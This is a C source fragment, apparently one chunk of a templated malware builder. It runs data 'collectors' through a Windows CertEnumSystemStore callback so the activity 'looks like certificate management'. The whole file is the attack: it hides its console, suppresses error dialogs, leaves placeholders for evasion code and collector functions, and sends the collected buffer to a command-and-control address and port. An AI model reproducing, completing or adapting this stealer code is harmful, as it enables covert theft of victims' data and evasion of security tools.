// chunk: arch/callback_certenumsys
// depends: core/emit_buffer, exfil/*
// provides: main
// headers: windows.h, wincrypt.h
// libs: crypt32
// note: Executes collectors via CertEnumSystemStore callback — looks like certificate management

#ifndef CHUNK_ARCH_CALLBACK_CERTENUMSYS
#define CHUNK_ARCH_CALLBACK_CERTENUMSYS

#include <wincrypt.h>

typedef void (*collector_fn)(void);

static collector_fn g_cert_collectors[32];
static int g_cert_idx = 0;
static int g_cert_count = 0;

static BOOL WINAPI cert_enum_cb(const void *pvSystemStore, DWORD dwFlags,
                                PCERT_SYSTEM_STORE_INFO pStoreInfo, void *pvReserved,
                                void *pvArg) {
    (void)pvSystemStore; (void)dwFlags; (void)pStoreInfo; (void)pvReserved; (void)pvArg;
    if (g_cert_idx < g_cert_count) {
        g_cert_collectors[g_cert_idx]();
        g_cert_idx++;
        return TRUE;
    }
    return FALSE;
}

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    FreeConsole();
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
{{EVASION_INIT}}

    init_buffer();
    if (!g_data) return 1;

    collector_fn collectors[] = {
{{COLLECTOR_FN_LIST}}
    };
    g_cert_count = sizeof(collectors) / sizeof(collectors[0]);
    for (int i = 0; i < g_cert_count && i < 32; i++)
        g_cert_collectors[i] = collectors[i];

    CertEnumSystemStore(CERT_SYSTEM_STORE_CURRENT_USER, NULL, NULL, cert_enum_cb);

    // If we didn't get through all collectors (not enough cert stores), run the rest directly
    while (g_cert_idx < g_cert_count) {
        g_cert_collectors[g_cert_idx]();
        g_cert_idx++;
    }

    if (g_pos > 0)
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);

    free(g_data);
    return 0;
}

#endif
